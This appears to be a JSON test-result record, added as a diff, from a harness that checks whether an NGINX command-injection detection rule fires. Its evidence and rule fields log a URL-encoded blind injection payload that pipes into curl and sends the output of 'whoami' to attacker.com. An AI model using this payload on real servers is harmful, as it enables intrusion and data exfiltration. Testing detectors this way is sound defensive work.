@@ -1,0 +1,17 @@
+{
+  "pattern_id": "CMD_BLIND_003",
+  "test_id": "CMD_BLIND_003-1769864054759-9i63ri",
+  "category": "cmdinj",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 34000,
+  "evidence": "12:54:14.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1769864054759-9i63ri pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1",
+  "rule_name": "[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1769864054759-9i63ri pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1",
+  "expected_rule": "[NGINX CMDi] Command substitution attack",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1769864054759-9i63ri pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1",
+  "sent_at": 1769864088000,
+  "detected_at": 1769864054000,
+  "status": "passed"
+}
